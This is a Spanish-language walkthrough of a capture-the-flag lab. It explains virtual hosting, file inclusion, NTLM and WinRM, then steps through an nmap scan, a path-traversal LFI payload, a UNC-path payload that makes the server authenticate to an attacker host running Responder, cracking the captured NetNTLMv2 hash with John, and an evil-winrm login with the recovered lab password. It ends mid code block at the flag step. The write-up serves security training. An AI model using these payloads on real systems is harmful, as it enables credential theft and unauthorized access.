# Laboratorio de Penetración: Explotación de LFI para Captura de NTLMv2 Hash y Acceso a WinRM

## Introducción
Este laboratorio detalla el proceso de explotación de una vulnerabilidad de Inclusión de Archivos Locales (LFI) en una aplicación web PHP ejecutándose en un servidor Windows. El objetivo principal es la captura de un hash NetNTLMv2 del usuario bajo el cual se ejecuta el servicio web, para luego crackearlo y obtener acceso remoto al sistema a través de WinRM.

Este README servirá como una guía rápida para repasar los conceptos y la metodología aplicada en el laboratorio.

## Conceptos Clave
Antes de sumergirnos en los pasos, es crucial entender algunos conceptos fundamentales:

### Name-Based Virtual Hosting
Es un método que permite a un único servidor web alojar múltiples dominios (sitios web) utilizando la misma dirección IP. El servidor distingue entre los sitios basándose en el encabezado `Host` enviado por el navegador en la solicitud HTTP.

1.  **Tu navegador (tú, enviando una carta) quiere visitar `unika.htb`**.
2.  **Resolución DNS**: Tu computadora necesita la dirección IP de `unika.htb`. Si el servidor DNS no lo conoce (común en entornos de laboratorio), tu navegador no sabrá a dónde conectarse, resultando en un error "Hmm. We're having trouble finding that site.".
3.  **/etc/hosts**: Este archivo local en tu computadora actúa como una "agenda de direcciones personal". Puedes mapear un nombre de dominio a una dirección IP específica. Al añadir `10.129.128.223 unika.htb` a tu `/etc/hosts`, le indicas a tu computadora la IP a la que debe ir cuando solicitas `unika.htb`.
4.  **Encabezado Host**: Incluso con la IP conocida, cuando el navegador envía la solicitud HTTP al servidor, incluye un encabezado `Host` que le dice al servidor qué sitio específico (`unika.htb`) está buscando entre los varios alojados en esa IP.
5.  **Virtual Hosting Basado en Nombres**: El servidor web utiliza este encabezado `Host` para mostrar el sitio web correcto.

### Vulnerabilidad de Inclusión de Archivos (File Inclusion)
Las vulnerabilidades de inclusión de archivos ocurren cuando una aplicación web permite que un atacante incluya un archivo que no estaba destinado a ser parte de la aplicación, generalmente manipulando la ruta de un archivo como entrada.

* **Inclusión Local de Archivos (LFI - Local File Inclusion)**: Sucede cuando un atacante logra que un sitio web incluya un archivo local del sistema al cual no debería tener acceso. Esto se explota a menudo utilizando la cadena `../` para retroceder en la estructura de directorios y acceder a archivos sensibles. En algunos casos, puede llevar a la ejecución de código.
* **Inclusión Remota de Archivos (RFI - Remote File Inclusion)**: Similar a LFI, pero en este caso, el atacante puede cargar un archivo desde un host remoto utilizando protocolos como HTTP, FTP, etc.

### Método `include()` en PHP
La declaración `include()` en PHP toma el texto/código/marcado de un archivo especificado y lo carga en memoria, haciéndolo disponible para su uso. Si esta función no maneja la entrada de forma segura, es susceptible a ataques de inclusión de archivos.

### Autenticación NTLM (New Technology LAN Manager)
NTLM es una colección de protocolos de autenticación de desafío-respuesta de Microsoft, utilizados para autenticar clientes a recursos en un dominio de Active Directory. Es un tipo de inicio de sesión único (SSO).

**Proceso de autenticación NTLM:**

1.  **El cliente se presenta**: Envía nombre de usuario y dominio al servidor.
2.  **El servidor "desafía"**: Genera una cadena aleatoria (el "desafío") y la envía al cliente.
3.  **El cliente responde**: El cliente combina el desafío con un hash de su contraseña (NTLM hash) y lo encripta, enviando la "respuesta" resultante de vuelta al servidor. ¡Nunca se envía la contraseña real!
4.  **El servidor verifica**: El servidor, con el hash de la contraseña registrado, realiza la misma operación criptográfica con el desafío.
5.  **Comparación y autenticación**: Si el resultado del servidor coincide con la respuesta del cliente, la autenticación es exitosa.

### NTHash vs. NetNTLMv2
La terminología puede ser confusa:

* **Función Hash**: Una función unidireccional que toma datos y devuelve un valor de tamaño fijo (hash, digest, huella digital). Se usan para almacenar contraseñas de forma segura, ya que no se pueden revertir directamente.
* **NTHash**: Es el resultado del algoritmo usado para almacenar contraseñas en sistemas Windows (base de datos SAM, controladores de dominio). A menudo se le llama erróneamente "hash NTLM".
* **NetNTLMv2**: Cuando NTLM se autentica en red, usa un modelo de desafío/respuesta. Un desafío/respuesta NetNTLMv2 es una cadena formateada que incluye el desafío y la respuesta. Aunque no es un hash en sí mismo, se le ataca de la misma manera y comúnmente se le llama "hash NetNTLMv2" o incluso "NTLMv2".

### Excepción Peligrosa: URLs SMB y NTLM
Las directivas de PHP `allow_url_include` y `allow_url_fopen` (por defecto en `Off`) previenen que las funciones de inclusión de archivos carguen recursos remotos vía HTTP o FTP, lo cual es una buena práctica de seguridad.

Sin embargo, PHP **no previene** la carga de URLs SMB (Server Message Block), incluso con estas directivas en `Off`. SMB es un protocolo de red de Windows para compartir archivos.

Esto significa que si una aplicación PHP vulnerable intenta "incluir" una ruta SMB (ej., `\\TU_IP_ATACANTE\recurso_inexistente`), el sistema operativo Windows subyacente intentará conectarse al servidor SMB que se encuentre escuchando en esa IP. Durante este intento de conexión, el cliente Windows iniciará un proceso de autenticación NTLM con el atacante.

El sistema operativo Windows se autenticará con las credenciales de la cuenta de usuario bajo la cual se está ejecutando el servicio web (o el proceso PHP), y no con una contraseña "incorporada" en la aplicación PHP. Herramientas como Responder pueden simular un servidor SMB y capturar el hash NetNTLMv2 durante este proceso.

### WinRM (Windows Remote Management)
WinRM es un protocolo de administración remota nativo de Windows que usa SOAP para interactuar con computadoras y servidores remotos. Permite la comunicación, ejecución remota de comandos, monitoreo y configuración de sistemas. Para un pentester, obtener credenciales de un usuario con privilegios de gestión remota puede llevar a obtener una shell de PowerShell en el host.

---

## Pasos del Laboratorio

### 1. Enumeración Inicial con Nmap
Se inicia el proceso escaneando el host objetivo para identificar puertos abiertos y servicios en ejecución.
```bash
nmap -p- --min-rate 1000 -sV 10.129.128.223
```
* `-p-`: Escanea todos los puertos TCP (0-65535).
* `-sV`: Intenta determinar la versión del servicio.
* `--min-rate 1000`: Acelera el escaneo enviando un mínimo de 1000 paquetes por segundo.

**Resultados del Nmap:**
* Sistema Operativo: Windows.
* Puerto `80/tcp`: Abierto, corriendo `Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)`.
* Puerto `5985/tcp`: Abierto, corriendo `Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)` (WinRM).

### 2. Enumeración del Sitio Web y Configuración de /etc/hosts
Al intentar acceder al sitio web `http://[target ip]`, el navegador redirige a `http://unika.htb/`, indicando un Virtual Hosting Basado en Nombres.

Para resolver este hostname localmente:
```bash
echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
```
Esto permite al navegador resolver `unika.htb` a la IP correcta y enviar el encabezado `Host: unika.htb`, haciendo que el servidor responda con la página web de `unika.htb`.

### 3. Detección de Inclusión de Archivos Locales (LFI)
Se observa una opción de selección de idioma en el sitio web (EN/FR). Al cambiar a "Fr", la URL muestra `unika.htb/index.php?page=french.html`. Esto sugiere una posible vulnerabilidad LFI si el parámetro `page` no es sanitizado.

Se prueba la vulnerabilidad intentando incluir el archivo `hosts` de Windows:
```
[http://unika.htb/index.php?page=..///////./windows/system32/drivers/etc/hosts](http://unika.htb/index.php?page=..///////./windows/system32/drivers/etc/hosts)
```
* La cadena `../` se usa para retroceder directorios hasta la raíz `c:\`.

**Resultado:** Se logra visualizar el contenido del archivo `c:\windows\system32\drivers\etc\hosts` en la respuesta del navegador, confirmando la vulnerabilidad LFI. Esto ocurre porque la aplicación usa la función `include()` de PHP sin sanitización adecuada.

### 4. Captura de Hash NetNTLMv2 con Responder
Dado que el servidor web corre en Windows y es vulnerable a LFI, se aprovecha la excepción de PHP que no bloquea la carga de URLs SMB, incluso con `allow_url_include` y `allow_url_fopen` en `Off`.

1.  **Verificar Configuración de Responder**: Asegurarse de que Responder esté configurado para escuchar peticiones SMB (`SMB = On` en `Responder.conf`).
2.  **Iniciar Responder**:
    ```bash
    sudo python3 Responder.py -I tun0
    ```
    (Reemplaza `tun0` con tu interfaz de red de ataque, si es diferente). Responder simula un servidor SMB y escucha las peticiones de autenticación.
3.  **Enviar Payload LFI con URL SMB**: Desde el navegador, se solicita una URL SMB apuntando a la IP de la máquina del atacante:
    ```
    [http://unika.htb/?page=](http://unika.htb/?page=)\\10.10.14.25\somefile
    ```
    (Asegúrate de reemplazar `10.10.14.25` con la IP de tu máquina Kali/atacante).
4.  **Resultado**: Aunque la aplicación web muestra un error de "Permission denied" al intentar cargar el archivo, Responder en la máquina atacante captura el hash NetNTLMv2 del usuario `Administrator` (o la cuenta bajo la cual se ejecuta el servicio web).

### 5. Crackeo del Hash NetNTLMv2 con John the Ripper
El hash capturado se guarda en un archivo (ej., `hash.txt`) y se utiliza John the Ripper para crackearlo.

1.  **Guardar el hash**:
    ```bash
    echo "Administrator::DESKTOP-H30F232:..." > hash.txt
    ```
    (Copia el hash completo capturado por Responder).
2.  **Crackear el hash**:
    ```bash
    john -w=/usr/share/wordlists/rockyou.txt hash.txt
    ```
    * `-w`: Especifica el diccionario a usar (`rockyou.txt` es un diccionario común).
3.  **Resultado**: John identifica automáticamente el tipo de hash (`netntlmv2`) y, después de procesar el diccionario, revela la contraseña: `badminton`.

### 6. Acceso Remoto con Evil-WinRM
Con el usuario (`Administrator`) y la contraseña (`badminton`) obtenidos, se utiliza `evil-winrm` para establecer una sesión remota de PowerShell a través del servicio WinRM.
```bash
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```
* `-i`: Especifica la dirección IP del objetivo.
* `-u`: Nombre de usuario.
* `-p`: Contraseña.

**Resultado:** Se obtiene una shell de PowerShell en el sistema objetivo, confirmando el acceso.

### 7. Obtención de la Flag
Finalmente, se navega al directorio `c:\Users\mike\Desktop\` y se lista su contenido para encontrar el archivo `flag.txt`.
```powershell
dir
type flag.txt
